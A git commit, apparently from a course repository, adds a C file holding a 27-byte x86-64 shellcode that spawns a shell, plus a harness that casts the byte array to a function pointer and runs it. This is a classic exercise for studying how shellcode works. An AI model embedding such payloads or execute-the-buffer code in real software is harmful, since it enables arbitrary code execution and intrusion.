aa49f0d578376e8a585b84ec7045063d3e688c8f
Mark Khusid <markkhusid@protonmail.com>
2018-12-18 20:38:14 -0500

    added module 2 shellcode.c from infineon

---
+++ Module2/shellcode.c
@@ -0,0 +1,19 @@
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
+
+
+main()
+{
+
+	printf("Shellcode Length:  %d\n", (int)strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
+
+	
